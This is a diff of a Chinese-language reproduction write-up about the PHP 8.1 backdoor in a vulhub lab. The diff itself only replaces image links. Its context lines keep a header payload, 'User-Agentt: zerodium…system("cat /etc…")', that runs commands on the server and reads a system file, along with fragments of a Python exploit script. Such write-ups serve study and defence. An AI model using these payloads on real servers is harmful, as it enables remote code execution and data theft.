@@ -84,7 +84,7 @@ cd vulhub/php/8.1-backdoor
 sudo docker-compose up -d
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCH9wW40HrjXFUbJicDowtsgRJkdIf1pGq4lhwVbAm8lJ9m3q8084ciakrg/640?wx_fmt=png)
+![](../../.resource/remote/c970ec0e59f315330ca485ed684737b21c143a202e3daebdf9d56d948365dff5.png)
 
 访问主页  
 
@@ -93,7 +93,7 @@ http://192.168.40.140:8080/
 ```
 
   
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHBZnr2ibViaADL8LGGjGfXD4209jVcNESiaL0Eu77OwAEhdl6uJ3eyAD1Q/640?wx_fmt=png)  
+![](../../.resource/remote/c6ffb5b718701e764f5e07665a49a641bf49f2c3f3939a2110088a07a945f96a.png)  
   
 
 **0x05 漏洞复现**  
@@ -114,9 +114,9 @@ User-Agentt: zerodiumvar_dump(2*3); //或者User-Agentt: zerodiumsystem("cat /et
 Upgrade-Insecure-Requests: 1
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHyI2k95vdpEcF6FRzvos0wAuNLUGawREQtKTUc4GfNuFFjbO1mv1ia8Q/640?wx_fmt=png)
+![](../../.resource/remote/292f5841d73da111e1f2065aa5f1838bfc41f3d5471f1758c3adfdeeffe1c1f0.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHGLsmf45GiaKqaNb1NdynFiclWjRt1PN1R96jicgpPrpBJDfZPkPwNArtw/640?wx_fmt=png)
+![](../../.resource/remote/da5a9f6f1b270bb8b94e6fc0b48f361666feecfc5435d06755ae29f60aef0117.png)
 
 ```
 #!/usr/bin/env python3
@@ -168,8 +168,8 @@ Upgrade-Insecure-Requests: 1
 ```
 
   
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHpyOEEBlS1dseBu0xGbqu2NIyjKDHVlFzXHeCe0MVktyic6J22wKNoxw/640?wx_fmt=png)  
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHsfINHFicQTHqILcoIVpAoYicJu4wHhKOUOuXsWiaNcrDgnEibprDQv3DNA/640?wx_fmt=png)  
+![](../../.resource/remote/b84652951196140e826b6a4bef8a2d0b18121dc2c5419fc166b609f596aaa56d.png)  
+![](../../.resource/remote/2c80530dccd515a03ba0cadcb822b07aa19288bd24540dc8328b6f1da4aa9a99.png)  
 
 EXP：
 
@@ -246,7 +246,7 @@ if __name__ == "__main__":
         print('Invalid URL or Target not Vulnerable')
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsia2DU8EGK3ITzSRIutkvOCHZPacPsDLu3pxlTqLspsLhHJWIfmNQ3cDQfaNpt58Zgsia5CXGkpFnuA/640?wx_fmt=png)  
+![](../../.resource/remote/710597b90f9b064d77a4ee5b192e68feb1cc9b198e3b59f1fdd27777b02957bf.png)  
 
 **0x06 修复方式**  
 
@@ -262,11 +262,11 @@ https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor
 
 https://www.php.net/
 
-![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)
+![](../../.resource/remote/f7aeba0e95eb4a20920b4c212aa5fad609c078147e0fa0fb48ac7cd256ebd10d.png)
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/c67f69ad0be4f67e52b7e4cc8900f4f6ea40aaedbccfc980185bb2fa117a4b7f.jpg)
 
 **阅读原文看更多复现文章**
 
